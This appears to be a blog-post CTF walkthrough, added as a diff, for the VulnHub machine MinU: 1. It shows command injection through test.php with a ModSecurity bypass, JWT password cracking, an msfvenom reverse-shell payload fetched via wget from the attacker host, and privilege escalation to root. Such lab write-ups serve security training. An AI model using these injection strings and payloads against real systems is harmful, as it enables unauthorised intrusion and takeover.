@@ -1,0 +1,109 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the MinU: 1 (CTF Challenge)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-minu-1-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2018-09-22T05:20:05+00:00">September 22, 2018</time><time class="updated" datetime="2025-06-10T20:29:36+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Hello Friends! Today we are going to solve another CTF challenge “MinU: 1” This boot2root is an Ubuntu Based virtual machine and has been tested using Virtualbox. The network interface of the virtual machine will take its IP settings from DHCP. Your goal is to capture the flag on /root.</span></p>
+<p><span style="color: #000000;">You can download it from here: <span style="color: #3366ff;">https://www.vulnhub.com/entry/minu-1,235/</span></span></p>
+<p><span style="color: #000000;"><strong>Level:</strong> Easy/Intermediate</span></p>
+<p><span style="color: #000000;"><strong>Penetrating Methodology</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Network scanning (Nmap)</span></li>
+<li><span style="color: #000000;">Web Directory Enumeration (Dirb)</span></li>
+<li><span style="color: #000000;">Found RCE Vulnerability</span></li>
+<li><span style="color: #000000;">Digging out JSON Web Token from inside ._pw_</span></li>
+<li><span style="color: #000000;">Obtain password by using “c-jwt-cracker” for JSON Web Token</span></li>
+<li><span style="color: #000000;">Generate elf payload (msfvenom)</span></li>
+<li><span style="color: #000000;">Upload the backdoor inside /tmp</span></li>
+<li><span style="color: #000000;">Obtain reverse session (Netcat)</span></li>
+<li><span style="color: #000000;">Go for root access</span></li>
+<li><span style="color: #000000;">Use environment shell to spawn proper tty shell</span></li>
+<li><span style="color: #000000;">Capture the Flag</span></li>
+</ul>
+<p><span style="color: #000000;"><b><u>Walkthrough</u></b></span></p>
+<p><span style="color: #000000;">Since the IP of the target machine is 192.168.1.108, therefore let’s start with nmap aggressive scan.</span></p>
+<pre class="lang:default decode:true ">nmap –A 192.168.1.108</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://4.bp.blogspot.com/-G8B5ChHSr_U/W6XOigUEe7I/AAAAAAAAaXg/ClPtcbdDCAkzCWA_Pvul_bsW0UnZ8appwCLcBGAs/s1600/1.png"/></strong></span></p>
+<p><span style="color: #000000;">From the nmap scan result, we found port 80 is open for http service, let’s navigate to port 80 through browser.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-N2sQdCdCk-w/W6XOlKhvRAI/AAAAAAAAaYI/ww1iMy_KS6QBoyCSikEOd0MFVKLXgT1iACLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">Since we found nothing at the home page, therefore next we used dirb for web directory enumeration.</span></p>
+<pre class="lang:default decode:true">dirb http://192.168.1.108/ -X .php</pre>
+<p><span style="color: #000000;">With the help of above command, we try to enumerate .php extension files and luckily we found a “<strong>test.php</strong>” file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-t9fp_70MkLU/W6XOl-LR4DI/AAAAAAAAaYQ/MikinhOshCsdMk-6rjJBNxzPQmXlxcX0ACLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">So, when we explored /test.php file in the browser, it welcomes us with the following web page, where we found a hyperlink for the next web page.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-lsbzckDAf4E/W6XOl33P95I/AAAAAAAAaYU/WxHP6I5hv30i-1L_OqCx_yqJxPJ8IgY3QCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">Here the web page “Read last visitor data” was vulnerable to remote code execution. As you can observe that in the URL we try to run pwd command. As result, it shown /var/www/html as the current directory.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GA4Y_6Kr46s/W6XOlx_VM4I/AAAAAAAAaYY/xD_5vq0sXVsgjtoXHARVKspHF3JstgyUACLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">Next, we had used wafwoof for scanning the type of web application firewall used on the target machine.</span></p>
+<pre class="lang:default decode:true">wafw00f http://192.168.1.108</pre>
+<p><span style="color: #000000;">After we run wafw00f we find that the target machine has implemented <strong>modsecurity</strong> as web application firewall.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-yF1i1z7Edm0/W6XOmV_c87I/AAAAAAAAaYc/S_9-IP0GKSoiGocBausDGtAIUPPd6yqhgCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">After finding out the WAF, we bypass it by executing following command in the URL.</span></p>
+<pre class="lang:default decode:true">http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+lsb_release -a</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-qQswJL6zpro/W6XOmV5xbFI/AAAAAAAAaYg/8Qd-pDWiwsMj-ETKqXS-W6yIqg0EDdThwCLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">Hence we found out the kernel details of the target machine.</span></p>
+<p><span style="color: #000000;">Similarly, we run following command to find out available user directory inside the /home folder.</span></p>
+<pre class="lang:default decode:true">http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+ls /home</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pZRhHR_ZEbc/W6XOmSUg5dI/AAAAAAAAaYk/jz5GREPwe48J9t6sIOEaCLil-xhWaf3GQCLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">So we found <strong>bob</strong> could be the name of user directory.</span></p>
+<p><span style="color: #000000;">Then we run following command to view the available file and folder inside /home/bob.</span></p>
+<pre class="lang:default decode:true ">http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+ls -la /home/bob</pre>
+<p><span style="color: #000000;">Here we found a file<strong>”._pw_</strong>”</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-iv4qZVLFLVI/W6XOmo9yoeI/AAAAAAAAaYo/_RFD1iYisYwojxmHbw3qAkqa4BdSdzS8QCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">Then we opened the above obtained file with help of cat command and for that we run the following command.</span></p>
+<pre class="lang:default decode:true">http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+cat /home/bob/._pw_</pre>
+<p><span style="color: #000000;">It put up some encoded text in front of us which could be the password but I did not know much about it, what this was, therefore I take help from google and found out that this is a <strong>JSON Web Token</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8Lj93NX6LZ4/W6XOisrEKEI/AAAAAAAAaXk/HuepBGeoEz43hPe_GFvr0MJQSX2KUf6YQCLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA or ECDSA.</span></p>
+<p><span style="color: #000000;">Source: <span style="color: #3366ff;">https://jwt.io/introduction/</span></span></p>
+<p><span style="color: #000000;">So I found a tool from the github to crack the JSON web token called <strong>c-jwt-cracker</strong>.</span></p>
+<pre class="lang:default decode:true">git clone https://github.com/brendan-rius/c-jwt-cracker.git
+cd c-jwt-cracker/
+apt-get install libssl-dev
+make</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-YGoCXSbemsA/W6XOi2tgHoI/AAAAAAAAaXo/Fl3z4F_GSao7iYnnox5HQhJkGNCnaee1QCLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;"><strong>Copy</strong> the encoded text from the “._pw_” to decrypt it.  Now run the c-jwt-crack tool and paste the encoded string as its argument as shown in the image.</span></p>
+<pre class="lang:default decode:true">./jwtcrack [paste code here]</pre>
+<p><span style="color: #000000;">This will give the password: “<strong>mlnv1</strong>”</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-vvRHS43zMtU/W6XOjUyu4QI/AAAAAAAAaXs/ELzvDix2CWkcTtQJrV2lrMsO36jSZG_OgCLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">Now let’s create a payload using msfvenom with the help of following command:</span></p>
+<pre class="lang:default decode:true">msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.1.106 lport=4444 -f elf &gt; /root/Desktop/shell</pre>
+<p><span style="color: #000000;">Above command will generate the elf payload, now we will transfer this malicious file “shell” to the target with the help of PHP server.</span></p>
+<pre class="lang:default decode:true">php –S 0.0.0.0:80</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-kTfK6wpz_dw/W6XOjl8jk-I/AAAAAAAAaXw/-UnJgfdNQSouA3uq5fR-BNjwxaPS3nSZwCLcBGAs/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">Then download the above malicious file with the help of wget, hence you can run the following command for downloading it into target machine.</span></p>
+<pre class="lang:default decode:true">http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+wget+-O+/tmp/shell+http://192.168.1.106/shell</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-25XoOrX65es/W6XOj5iyetI/AAAAAAAAaX0/yk2EdIbpKwc9lA76B9xHOcNOqASThsyWACLcBGAs/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">Now let’s check whether the file is uploaded successfully or not!</span></p>
+<p><span style="color: #000000;">Run following command to view the malicious file “shell” file inside the /tmp directory.</span></p>
+<pre class="lang:default decode:true">http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+ls /tmp</pre>
+<p><span style="color: #000000;">Yuppieee!!! In the given below image you can observe that we have successfully uploaded the shell file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-9UO066za568/W6XOjxHhV6I/AAAAAAAAaX4/g9iobuGBbGoIZ0nz3gl3OP-NSnn06W7ZACLcBGAs/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">Now give the full permission to the uploaded file “shell” with the help of the following command:</span></p>
+<pre class="lang:default decode:true">http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+chmod 777 /tmp/shell</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-En8nzhJXnVk/W6XOkBxtTpI/AAAAAAAAaX8/2gSPY4-qr78eYvPpPvFM3XSwOeeJG-UEQCLcBGAs/s1600/17.png"/></span></p>
+<p> </p>
+<p><span style="color: #000000;">Let’s verify the given permission with help of the following command:</span></p>
+<pre class="lang:default decode:true">http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+ls -la /tmp/shell</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3f2xuL5hqnI/W6XOk7cLitI/AAAAAAAAaYA/Jws1aEuxosEco6PHryiGsXuE52L2OunXACLcBGAs/s1600/18.png"/></span></p>
+<p><span style="color: #000000;">Now let’s execute the file “shell” but do not forget to start netcat as the listener.</span></p>
+<pre class="lang:default decode:true">http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+/tmp/shell</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-QcT94gUdKsc/W6XOk6BP30I/AAAAAAAAaYE/DFtzzjAJaAMopkwBx8QvhAzm3TkHu-dagCLcBGAs/s1600/19.png"/></span></p>
+<pre class="lang:default decode:true">nc –lvp 4444</pre>
+<p><span style="color: #000000;">Hurray!!! We got the reverse shell of the target’s machine and now let’s try to grab the flag.txt file to finish this task. For grabbing the flag.txt file we need the root access and proper tty shell of the machine.</span></p>
+<p><span style="color: #000000;">Here we try to use python-one-liner to spawn a tty shell but unfortunately python was not installed on the target machine. So instead we used environment variable to spawn the tty shell.</span></p>
+<p><span style="color: #000000;">Now run the following commands to spawn the tty shell and then try to capture flag.txt file.</span></p>
+<pre class="lang:default decode:true">bash -i
+SHELL=/bin/bash script -q /dev/null
+su root</pre>
+<p><span style="color: #000000;">Boooom!!!! We have root access now let’s fetch the flag.txt file.</span></p>
+<pre class="lang:default decode:true ">ls
+cat flag.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CFJ0eN6YV_E/W6XOlQ5mm4I/AAAAAAAAaYM/tETe-EqP3l4BfmHz5AcQgNnC4OUQNT6YwCLcBGAs/s1600/20.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
